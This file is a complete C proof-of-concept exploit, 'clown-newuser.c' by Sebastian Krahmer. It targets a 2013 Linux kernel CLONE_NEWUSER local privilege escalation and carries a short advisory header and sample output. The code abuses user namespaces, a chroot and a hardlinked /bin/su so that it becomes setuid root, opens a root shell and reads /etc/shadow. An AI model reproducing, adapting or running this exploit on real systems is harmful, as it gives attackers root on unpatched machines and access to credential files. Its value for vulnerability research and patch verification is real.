/*
source: http://www.securityfocus.com/bid/58478/info

Linux kernel is prone to a local privilege-escalation vulnerability.

Local attackers can exploit this issue to gain kernel privileges, which will aid in further attacks. 
*/

/* clown-newuser.c -- CLONE_NEWUSER kernel root PoC
 *
 * Dedicated to: Locke Locke Locke Locke Locke Locke Locke!
 *
 * This exploit was made on the 13.3.13.
 *
 * (C) 2013 Sebastian Krahmer
 *
 * We are so 90's, but we do 2013 xSports.
 *
 * Must be compiled static:
 *
 * stealth@linux-czfh:~> cc -Wall clown-newuser.c -static
 * stealth@linux-czfh:~> ./a.out
 * [**] clown-newuser -- CLONE_NEWUSER local root (C) 2013 Sebastian Krahmer
 *
 * [+] Found myself: '/home/stealth/a.out'
 * [*] Parent waiting for boomsh to appear ...
 * [*] Setting up chroot ...
 * [+] Done.
 * [*] Cloning evil child ...
 * [+] Done.
 * [*] Creating UID mapping ...
 * [+] Done.
 * [+] Yay! euid=0 uid=1000
 * linux-czfh:/home/stealth # grep bin /etc/shadow
 * bin:*:15288::::::
 * linux-czfh:/home/stealth #
 *
 */
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>


int go[2];
char child_stack[1<<20];
extern char **environ;


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


int child(void *arg)
{
	char c;

	close(go[1]);
	read(go[0], &c, 1);

	setuid(0);

	/* this will also affect the parent, but the parent
	 * has the init_user_ns, so it will start suid with real uid 0.
	 */
	if (chdir("chroot") < 0)
		die("[-] chdir");
	if (chroot(".") < 0)
		die("[-] chroot");

	return 0;
}



int setup_chroot(const char *me)
{
	mkdir("chroot", 0755);
	mkdir("chroot/lib64", 0755);
	mkdir("chroot/bin", 0755);

	if (link(me, "chroot/lib64/ld-linux-x86-64.so.2") < 0)
		die("[-] link");
	if (link("/bin/su", "chroot/bin/su") < 0)
		die("[-] link");
	return 0;
}


int main(int argc, char *argv[])
{
	char *su[] = {"/bin/su", NULL};
	char *sh[] = {"/bin/bash", NULL};
	char me[256], *mee[] = {me, "1", NULL};
	char uidmap[128], map_file[128];
	pid_t pid;
	struct stat st;
	int fd;


	if (geteuid() == 0 && argc == 1) {
		/* this will run inside chroot, started as the ld.so from
		 * su process
		 */
		printf("[+] Yay! euid=%d uid=%d\n", geteuid(), getuid());
		chown("lib64/ld-linux-x86-64.so.2", 0, 0);
		chmod("lib64/ld-linux-x86-64.so.2", 04755);
		exit(0);
	} else if (geteuid() == 0) {
		/* this will run outside */
		setuid(0);
		execve(*sh, sh, environ);
		die("[-] execve");
	}

	printf("[**] clown-newuser -- CLONE_NEWUSER local root (C) 2013 Sebastian Krahmer\n\n");

	memset(me, 0, sizeof(me));
	readlink("/proc/self/exe", me, sizeof(me) - 1);
	printf("[+] Found myself: '%s'\n", me);

	if (fork() > 0) {
		printf("[*] Parent waiting for boomsh to appear ...\n");
		for (;;) {
			stat(me, &st);
			if (st.st_uid == 0)
				break;
			usleep(1000);
		}
		execve(me, mee, environ);
		die("[-] execve");
	}

	printf("[*] Setting up chroot ...\n");
	setup_chroot(me);
	printf("[+] Done.\n[*] Cloning evil child ...\n");

	if (pipe(go) < 0)
		die("[-] pipe");

	pid = clone(child, child_stack + sizeof(child_stack),
	            CLONE_NEWUSER|CLONE_FS|SIGCHLD, NULL);
	if (pid == -1)
		die("[-] clone");

	printf("[+] Done.\n[*] Creating UID mapping ...\n");

	snprintf(map_file, sizeof(map_file), "/proc/%d/uid_map", pid);
	if ((fd = open(map_file, O_RDWR)) < 0)
		die("[-] open");
	snprintf(uidmap, sizeof(uidmap), "0 %d 1\n", getuid());
	if (write(fd, uidmap, strlen(uidmap)) < 0)
		die("[-] write");
	close(fd);
	printf("[+] Done.\n");

	close(go[0]);
	write(go[1], "X", 1);

	waitpid(pid, NULL, 0);
	execve(*su, su, NULL);
	die("[-] execve");
	return -1;
}